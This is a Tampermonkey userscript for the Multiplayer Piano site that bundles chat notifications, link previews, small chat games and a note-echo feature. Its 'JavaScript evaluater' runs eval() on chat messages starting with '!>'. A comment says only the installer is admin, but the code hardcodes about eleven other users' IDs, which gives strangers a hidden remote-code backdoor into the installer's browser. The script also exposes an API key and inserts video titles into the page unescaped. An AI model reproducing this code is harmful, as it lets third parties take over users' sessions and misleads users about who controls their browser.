// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://multiplayerpiano.com/*
// @grant        none
// ==/UserScript==

prefix = '/';

blIds = [];
blNames = [];

//-electrashave
var chat_buffer = [];
MPP.chat.send = function(msg) {
  msg.match(/.{0,511}/g).forEach(function(x, i) {
    if (x === '') return;
    if (i !== 0) x = '...' + x;
    chat_buffer.push(x);
  });
};
var chatInt = setInterval(function() {
  var msg = chat_buffer.shift();
  if (msg) MPP.client.sendArray([{ m: 'a', message: msg }]);
}, 950);

MPP.client.on('a', function(msg) {
  // simple JavaScript evaluater in chat - meow :3
  if (typeof gScriptLoaded === 'undefined') {
    gScriptLoaded = true;

    var args;
    var cmd;
    var input;
    var isAdmin;
    var admins = [MPP.client.user._id]; // you're added by default.
    // If you want to add more preople use !js admins.push(their_id_here)
    // this will allow them to use !js too. But be careful who you trust!
    var cmdChar = '[]'; // you can change this to any single character :3

    Object.prototype.toString = function() {
      return JSON.stringify(this);
    };

    MPP.client.on('a', function(msg) {
      args = msg.a.split(' ');
      cmd = args[0];
      input = msg.a.substring(cmd.length).trim();

      adminIds = [
          MPP.client.getOwnParticipant()._id,
        'a2db90c04712080af5d797a1', //citronsustain
        '63ce4e6b86780ae23e04a5b8', //citronsustain
        'd55bf273f64f37c5691f3bbb', //Anon64
        '051ee1ec34cf0218653af6a8', //JPDLD
        '0eab0774ba77d8744c9bf2a4', //Infinity~
        '5b414d782edd2d3f517a5080', //dude/error
        'eda8c37f125a3641fe041799', //Japanese
        '6918006370d05f4802047186', //ATLAS A.I.
        '38abff0e409d31ee9e1b5781', //Jacob
        '5a75bfc94fb4cc2bcc3cc9b1', //Name
        'b6478b81da6ee004b7b47bbe'  //Vistril
      ];

      // anything inside this block will run if the user is an admin
      if (adminIds.includes(msg.p._id)) {
        if (cmd == '!>') {
          try {
            MPP.chat.send('> ' + JSON.stringify(eval(input)));
          } catch (err) {
            MPP.chat.send('' + err);
          }
        }
      } // else they're not admin
    });
  }
});

/* Better MPP V 0.5*/

checkNotification();

window.MPP.client.on('a', function(msg) {
  var message = msg.a;
  var name = window.MPP.client.getOwnParticipant().name;

  /*if(message.substring(0, name.length + 1).toLowerCase() == name.toLowerCase()){
 		var notification = new Notification(name + " is talking to you!");
    }
    */
  if (msg.p.name != name) {
    if (message.toLowerCase().indexOf(name.toLowerCase()) != -1) {
      var ding = new Audio(
        'https://www.freesound.org/data/previews/66/66136_606715-lq.mp3'
      ); //notification sound
      ding.play();

      var notification = new Notification(msg.p.name + ' said: ' + message); // Notification

      var list = $('#chat li ');
      list[list.length - 1].remove(); //removing double chat entry

      var li = $('<li><span class="name"/><span class="message"/>');
      li.find('.name').text(msg.p.name + ':');
      li.find('.message').text(msg.a);
      li.css('color', 'Black');
      li.css('background-color', 'rgba(255,0,0,0.4)'); //style of name

      $('#chat ul').append(li); // idk but it works
    }
  }
});

function checkNotification() {
  //checking if notifications is allowed

  if (!('Notification' in window)) {
    alert('This browser does not support desktop notification');
  } else if (Notification.permission === 'granted') {
  } else if (Notification.permission !== 'denied') {
    Notification.requestPermission(function(permission) {
      if (!('permission' in Notification)) {
        Notification.permission = permission;
      }
    });
  }
}

/*
Author: B@K$ (RU)
Version: 0.4
Function:
Ctrl+Right click - blur image
*/

document.styleSheets[0].addRule('a', 'text-decoration: none;', 0);
document.styleSheets[0].addRule('.blur-el', 'filter: blur(5px);', 0);
document.styleSheets[0].addRule(
  '.yt',
  'display:inline-block;position:relative;',
  0
);
document.styleSheets[0].addRule(
  '.yt span',
  'display: -webkit-box;position: absolute;bottom: 3px;left: 2px;-webkit-box-orient: vertical;-webkit-line-clamp: 2;font-family: Arial, Helvetica, sans-serif;background-color: rgba(0,0,0,.4);white-space: normal;overflow: hidden;',
  0
);

style = document.createElement('link');
style.rel = 'stylesheet';
style.href = 'https://cdnjs.cloudflare.com/ajax/libs/lity/1.6.6/lity.css';
document.getElementsByTagName('head')[0].appendChild(style);

$.getScript('https://cdnjs.cloudflare.com/ajax/libs/lity/1.6.6/lity.js');

var blurLinks = [];

$(document).on('contextmenu', '[data-lity]', null, function(e) {
  if (e.ctrlKey) {
    e.preventDefault();
    if (e.target.className === 'blur-el') {
      $('img[src=' + CSS.escape(e.target.src) + ']').each(
        (n, e) => (e.className = '')
      );
      if (blurLinks.indexOf(e.target.src) != -1) {
        blurLinks.splice(blurLinks.indexOf(e.target.src), 1);
      }
    } else {
      $('img[src=' + CSS.escape(e.target.src) + ']').each(
        (n, e) => (e.className = 'blur-el')
      );
      if (blurLinks.indexOf(e.target.src) === -1) {
        blurLinks.push(e.target.src);
      }
    }
  }
});

function parseYouTubeId(url) {
  var regex = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
  return url.match(regex) ? RegExp.$2 : null;
}

function parseVimeoId(url) {
  var regex = /^.*(vimeo.com\/|video\/)(\d+).*/;
  return url.match(regex) ? RegExp.$2 : null;
}

function isValidUrl(url) {
  return /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(
    url
  );
}

function parseLink(url, el_id) {
  var pAudio, pImage;
  pAudio = new Audio();
  pImage = new Image();
  pAudio.src = pImage.src = url;
  pAudio.isError = pImage.isError = false;

  pAudio.onloadeddata = function(e) {
    pAudio.controls = true;
    $(el_id)
      .html('')
      .append(pAudio)
      .append(`<a href="${url}" target="_blank">🌍</a>`);
  };
  pAudio.onerror = function(e) {
    pAudio.isError = true;
    if (pImage.isError)
      $(el_id).html(`<a href="${url}" target="_blank">${url}</a>`);
  };
  pImage.onload = function(e) {
    var x1 = 150;
    var y1 = 150;
    document.body.appendChild(this);
    var w = this.offsetWidth;
    var h = this.offsetHeight;
    document.body.removeChild(this);
    if (w >= h && w > y1) {
      pImage.height = Math.round(h / (w / x1));
      pImage.width = x1;
    } else if (w <= h && h > x1) {
      pImage.width = Math.round(w / (h / y1));
      pImage.height = y1;
    }
    if (blurLinks.indexOf(url) != -1) pImage.className = 'blur-el';
    $(el_id).html(`<a href="${url}" data-lity></a>`).find('a').append(pImage);
  };
  pImage.onerror = function(e) {
    pImage.isError = true;
    var ytId = parseYouTubeId(url);
    var vmId = parseVimeoId(url);
    if (ytId != null) {
      pImage.isError = false;

      $.getJSON(
        'https://www.googleapis.com/youtube/v3/videos?id=' +
          ytId +
          '&key=AIzaSyDL_iFb5QIUQf8fiG2Gx9-JEEkvfeU5H-Q&fields=items(id,snippet(channelId,title,categoryId),statistics)&part=snippet,statistics'
      ).done(i => {
        var imgLink = 'http://img.youtube.com/vi/' + ytId + '/mqdefault.jpg';
        var blurClass = blurLinks.indexOf(imgLink) != -1 ? 'blur-el' : '';
        $(el_id).html(`
					<div class="yt">
						<a title="${i.items[0].snippet.title}" href="${url}" data-lity>
							<img style="height:120px" class="${blurClass}" src="${imgLink}">
						</a>
						<span id="${ytId}">
							${i.items[0].snippet.title}
						</span>
					</div>
				`);
      });
    } else if (vmId != null) {
      pImage.isError = false;

      $.getJSON('http://vimeo.com/api/v2/video/' + vmId + '.json').done(i => {
        var imgLink = i[0].thumbnail_large;
        var blurClass = blurLinks.indexOf(imgLink) != -1 ? 'blur-el' : '';
        console.log(i, imgLink);
        $(el_id).html(`
					<div class="yt">
						<a title="${i[0].title}" href="${url}" data-lity>
							<img style="height:120px" class="${blurClass}" src="${imgLink}">
						</a>
						<span id="${vmId}">
							${i[0].title}
						</span>
					</div>`);
      });
    } else if (pAudio.isError)
      $(el_id).html(`<a href="${url}" target="_blank">${url}</a>`);
  };
}

MPP.client.on('a', msg => {
  var el = $('#chat li:last');
  if (el.find('.message').text() != msg.a) return; // Thanks electrashave
  var li = $('<li><span class="name"/><span class="message"/>');
  var content = msg.a
    .replace(/</g, '&lt;')
    .replace(
      /(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gi,
      function(url) {
        if (!isValidUrl(url)) return url;
        var nice = url;
        var el_id = Math.random().toString(36).slice(2);
        if (url.match('^https?://')) nice = nice.replace(/^https?:\/\//i, '');
        else url = 'http://' + url;
        parseLink(url, '#' + el_id);
        return '<span id="' + el_id + '">' + url + '</span>';
      }
    );
  li.find('.name').text(msg.p.name);
  li.find('.message').html(content);
  li.css({ color: msg.p.color || 'white', opacity: 1 });
  el.remove();
  $('#chat ul').append(li);
});

MPP.client.on('a', function(boi) {
  console.log(
    `%c${boi.p.name} (${boi.p._id}): ${boi.a}`,
    `color: ${boi.p.color}`
  );
});

MPP.client.on('a', msg => {
  var b = msg.a.split(' ')[0].toLowerCase();
  var input = msg.a.substring(b.length).trim();

  var rockwords = [
    'You Lose! Computer chose paper.',
    'You win! Computer chose scissors.',
    'Tie! You both chose rock.',
  ];
  var rockrandom = Math.floor(Math.random() * rockwords.length);

  var paperwords = [
    'You Lose! Computer chose scisssors.',
    'You win! Computer chose rock.',
    'Tie! You both chose paper.',
  ];
  var paperrandom = Math.floor(Math.random() * paperwords.length);

  var scissorswords = [
    'You Lose! Computer chose rock.',
    'You win! Computer chose paper.',
    'Tie! You both chose scissors.',
  ];
  var scissorsrandom = Math.floor(Math.random() * scissorswords.length); //FIXME: add some difficulty settings or something cause RPS is stupidly hard

  if (b == prefix + 'rps' || b == prefix + 'rockpaperscissors') {
    if (input === '') {
      MPP.chat.send(
        `Welcome to RPS! Do ${prefix}rps <rock, paper, scissors> to play!`
      );
    } else if (input == 'rock' || input == 'r' || input == 'rok') {
      MPP.chat.send(`RPS: ${rockwords[rockrandom]}`);
    } else if (input == 'paper' || input == 'p' || input == 'ppaer') {
      MPP.chat.send(`RPS: ${paperwords[paperrandom]}`);
    } else if (input == 'scissors' || input == 's' || input == 'sissors') {
      MPP.chat.send(`RPS: ${paperwords[paperrandom]}`);
    } else {
      MPP.chat.send(
        `Invalid syntax: Usage: ${prefix}rps <rock(r), paper(p), scissors(s)>. `
      );
    }
  }
});

MPP.client.on('a', function(msg) {
  var cmd = msg.a.split(' ')[0].toLowerCase();
  var input = msg.a.substring(cmd.length).trim();
  var eightballwords = [
    'It is certain',
    'It is decidedly so',
    'Without a doubt',
    'Yes, definitely.',
    'You may rely on it',
    'As I see it yes',
    'Most likely',
    'Outlook good',
    'Yes',
    'Signs point to yes',
    'Reply hazy, try again.',
    'Ask again later',
    'Better not tell you now',
    'Cannot predict now',
    'Concentrate and ask again',
    'Dont count on it',
    'My reply is no',
    'My sources say no',
    'Outlook not so good',
    'Very doubtful',
    'No',
  ];
  eightballrandom = Math.floor(Math.random() * eightballwords.length);
  if (cmd == prefix + '8ball') {
    if (blIds.includes(msg.p._id) || blNames.includes(msg.p.name)) {
    } else {
      if (input == '') {
        MPP.chat.send(
          '8ball: ' +
            msg.p.name +
            ", Ask me a question to answer, don't just stand there!"
        );
      } else {
        MPP.chat.send(
          '8ball: ' + msg.p.name + ', ' + eightballwords[eightballrandom]
        );
      }
    }
  }
});

MPP.client.on('a', function(msg) {
  var cmd = msg.a.split(' ')[0].toLowerCase();
  var input = msg.a.substring(cmd.length).trim();
  if (cmd == prefix + 'me') {
    if (blIds.includes(msg.p._id) || blNames.includes(msg.p.name)) {
    } else {
      MPP.chat.send(`**  ${msg.p.name} ${input}`);
    }
  }
});

MPP.client.on('a', function(msg) {
  var cmd = msg.a.split(' ')[0].toLowerCase();
  var input = msg.a.substring(cmd.length).trim();
  if (cmd == prefix + 'say') {
    if (blIds.includes(msg.p._id) || blNames.includes(msg.p.name)) {
    } else {
      MPP.chat.send(`\u034f ${input}`);
    }
  }
});

// DO NOT RELEASE THIS THIS IS COPYRIGHTED UNDER THE FEDERATION OF BUZZ NOTE PLAYERs
//Put this in your vars
var echonts = 0;
var echoPython = 0;

//put this with your buttons
$('body #bottom .relative').append(
  '<div id="up-btn" class="ugly-button" style="text-align: center; position: fixed;color: white; background-color: black; border-radius:50%; bottom: 6px;right: 45%;width: 40px; height: 40px;font-size:40px; title="Echo UP!"><br>▲</div>'
);
$('#up-btn').click(function() {
  echonts += 1;
  $('#echo-disp').text(echonts + 1);
});

$('body #bottom .relative').append(
  '<div id="echo-disp"style="text-align: center; position: fixed;color: white; background-color: black; border: inset grey; bottom: 6px;right: 50%;width: 45px; height: 40px;font-size:40px;"></div>'
);
$('#echo-disp').text(function() {
  //DISPLAY THE AMOUNT OF ECHOES
  //COLOUR CHANGER IS IN THE KEY EVENT HANDELER
  $(this).text(echonts + 1);
});
e = [];
setInterval(function() {
  if (MPP.client.noteBufferTime && e.length > 0) {
    MPP.client.sendArray([
      {
        m: 'n',
        t: MPP.client.noteBufferTime + MPP.client.serverTimeOffset,
        n: e,
      },
    ]);
    MPP.client.noteBufferTime = 0;
    e = [];
  }
}, 200);

var echoPython = 0;
$('#echo-disp').click(function() {
  echo = 0;
  if (echoPython == 0) {
    //mChat("Buzzynote®©™ IS ON");
    echoPython = 1;
    $('#echo-disp').css('background', 'red');

    MPP.client.noteBuffer.push = function(y) {
      if (y.n == 'spendNaN') return;
      var is = typeof y.d !== 'undefined';
      var n = is ? y.d : 0;
      for (var x = echonts; x--; ) {
        n += 20;
        OHS.piano.play(
          y.n,
          1,
          MPP.client.getOwnParticipant(),
          is ? n - y.d : n
        );
        e.push({ n: y.n, v: 1, d: n });
        //setTimeout((y)=>{/*OHS.press("spend");*/ OHS.piano.play(y.n, 1, MPP.client.getOwnParticipant(), 0);}, is ? n - y.d : n, y);
      }
      n = 0;
    };
  } else {
    echoPython = 0;
    //mChat("Buzzynote®©™ IS OFF");
    if (echo) {
      //Echo colour status
      $('#echo-disp').css('background-color', 'green', 'color', 'black');
    } else {
      $('#echo-disp').css('background-color', 'black', 'color', 'white');
    }
    MPP.client.noteBuffer = [];
    MPP.client.noteBuffer = [];
    MPP.client.noteBuffer = [];
    MPP.client.noteBuffer = [];
  }
});
//VOLUME DOWN
$('body #bottom .relative').append(
  '<div id="down-btn" class="ugly-button" style="text-align: center; position: fixed;color: white; background-color: black; border-radius:50%; bottom: 6px;right: 55%; width: 40px; height: 40px;font-size:40px; title="Echo DOWN!"><br>▼</div>'
);
$('#down-btn').click(function() {
  echonts -= 1;
  $('#echo-disp').text(echonts + 1);
  if (echonts == 0 || echonts == -1) {
    echonts = 0;
    $('#echo-disp').text(echonts + 1);
  }
});